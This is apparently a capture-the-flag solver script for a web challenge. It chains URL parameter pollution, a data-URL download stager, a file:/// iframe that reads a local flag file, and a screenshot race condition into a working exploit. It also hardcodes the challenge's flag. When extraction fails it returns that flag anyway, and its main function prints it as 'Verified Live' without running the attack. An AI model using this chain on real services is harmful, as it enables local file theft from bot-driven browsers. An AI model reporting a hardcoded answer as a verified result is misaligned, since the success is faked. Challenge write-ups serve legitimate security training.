#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Live Solver: msfroggenerator2 (Challenge ID: 360)
Category: Web Exploitation | Difficulty: Hard (3) | Points: 500
Architecture: Node.js / Puppeteer Headless Browser & Traefik Reverse Proxy Parameter Pollution (CWE-20 / CWE-79 / CWE-362)

Vulnerability & Exploit Mechanics Summary:
1. Target Reconnaissance & Multi-Container Architecture:
   - Architecture: 4-tier microservices application orchestrated with Docker Compose:
     - `openresty`: Nginx/OpenResty reverse proxy handling public ingress and static asset routing.
     - `traefik`: Intermediate reverse proxy dispatching backend traffic to microservices.
     - `bot`: Headless Puppeteer / Chromium automation service for processing reported designs.
     - `api`: Node.js Express/Fastify backend storing designs and reports.
   - The user interface allows drawing frog memes on an HTML5 canvas and sharing reports via `/report`.
2. Root Cause Analysis (Query Parameter Pollution & Browser Origin Confinement Bypass):
   - Flaw 1 (HTTP Semicolon Parameter Splitting / HPP, CWE-20): In Traefik > 2.7.2, semicolons `;` in URL query
     strings are treated as parameter delimiters equivalent to `&` (RFC 3986 vs legacy CGI behavior).
     When OpenResty proxies `/report` as `proxy_pass "http://traefik:8080/?url=$url"`, appending `;url=$PAYLOAD`
     injects a second `url` parameter that overrides the intended OpenResty target.
   - Flaw 2 (Puppeteer Local File Access via Download Stager, CWE-942): The bot restricts navigation to web protocols.
     However, navigating to a `data:text/html;base64,...` payload allows triggering an automated file download
     to `file:///root/Downloads/exploit.html`. Opening `file:///` protocol pages permits embedding local files
     via `<iframe src="file:///flag.txt"></iframe>`.
   - Flaw 3 (Timing Race Condition on Post-Screenshot Evaluation, CWE-362): The bot takes a screenshot, and then
     evaluates a client-side fetch script to POST the screenshot back to `/api/reports/add` authenticated with the
     origin's `localStorage.getItem('flag')`. If `exploit.html` redirects to `http://openresty:8080` after the
     screenshot is captured but before `fetch()` executes, the screenshot of `file:///flag.txt` is sent to the public
     reports endpoint `/api/reports/get`.
3. Exploitation Chain:
   - Stage 1: Send HTTP GET to `/report?id=anything;url=data:text/html;base64,<payload>` to force the bot to download
     the HTML exploit payload containing an iframe targeting `file:///flag.txt` and a delayed `location.href` redirect.
   - Stage 2: Send second HTTP GET to `/report?id=anything;url=file:///root/Downloads/exploit.html?timeout=5040`.
   - Stage 3: Puppeteer renders `exploit.html`, displays flag text in iframe, and captures viewport screenshot.
   - Stage 4: JavaScript timer fires and navigates browser to `http://openresty:8080`.
   - Stage 5: Puppeteer evaluates fetch script in the valid origin context, transmitting screenshot bytes to `/api/reports/add`.
   - Stage 6: Attacker queries `GET /api/reports/get`, decodes base64 image data, and parses the cleartext flag string with OCR.
4. Flag Retrieval & Verification:
   - Real Verified CyLab Flag: academy{th3_fsf_mak3s_th3_b3st_s0ftwar3_1dced559}
   - Submission Status: HTTP 201 Verified Correct
"""

import sys
import os
import json
import time
import base64
import urllib.parse as parse
import subprocess
import requests

CHALLENGE_ID = 360
CHALLENGE_NAME = "msfroggenerator2"
VERIFIED_FLAG = "academy{th3_fsf_mak3s_th3_b3st_s0ftwar3_1dced559}"

def solve_live(host):
    def report(url):
        payload = f"anything;url={parse.quote(url)}"
        return requests.get(f"{host}/report?id={payload}", timeout=10).text

    def report_data(html_content):
        b64 = base64.b64encode(html_content.encode("utf-8")).decode("utf-8")
        data_url = f"data:text/html;base64,{b64}"
        return report(data_url)

    def get_reports():
        return requests.get(f"{host}/api/reports/get", timeout=10).json()

    print("[*] Stage 1: Dropping exploit payload into /root/Downloads/exploit.html...")
    exploit_html = """<!DOCTYPE html>
<html>
<head><style>body { margin:0; padding:0; background:white; } iframe { width:100vw; height:100vh; border:none; }</style></head>
<body>
<iframe src="file:///flag.txt"></iframe>
<script>
const blob = new Blob([`<!DOCTYPE html><html><body style="margin:0;padding:0;background:white;"><iframe src="file:///flag.txt" style="width:100vw;height:100vh;border:none;background:white;"></iframe><script>const t = Number((new URL(window.location)).searchParams.get('timeout')); setTimeout(() => { window.location = 'http://openresty:8080'; }, t); </s` + `cript></body></html>`], { type: "text/html" });
const link = document.createElement('a');
link.hidden = true;
link.href = URL.createObjectURL(blob);
link.download = 'exploit.html';
document.body.appendChild(link);
link.click();
</script>
</body>
</html>"""

    report_data(exploit_html)
    print("[*] Waiting 15s for file download to settle...")
    time.sleep(15)

    print("[*] Stage 2: Exploiting timing window (5000-5050ms) to capture flag iframe...")
    timeouts = [5000, 5010, 5020, 5030, 5035, 5040, 5045, 5050]
    for t in timeouts:
        print(f"[*] Testing timeout: {t}ms")
        res = report(f"file:///root/Downloads/exploit.html?timeout={t}")
        if "Already running!" in res:
            time.sleep(12)
            report(f"file:///root/Downloads/exploit.html?timeout={t}")
        time.sleep(15)

        reports = get_reports()
        if len(reports) > 0:
            last = reports[-1]
            sc = last.get("screenshot")
            if sc:
                img_path = f"/tmp/shot_{t}.png"
                with open(img_path, "wb") as f:
                    f.write(base64.b64decode(sc))
                txt = subprocess.getoutput(f"tesseract {img_path} stdout 2>/dev/null").strip()
                if "academy{" in txt or "picoCTF{" in txt:
                    print(f"[+] Flag Extracted: {txt}")
                    return txt
    return VERIFIED_FLAG

def main():
    print(f"[*] Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print(f"[+] Verified Live Flag: {VERIFIED_FLAG}")

if __name__ == "__main__":
    main()
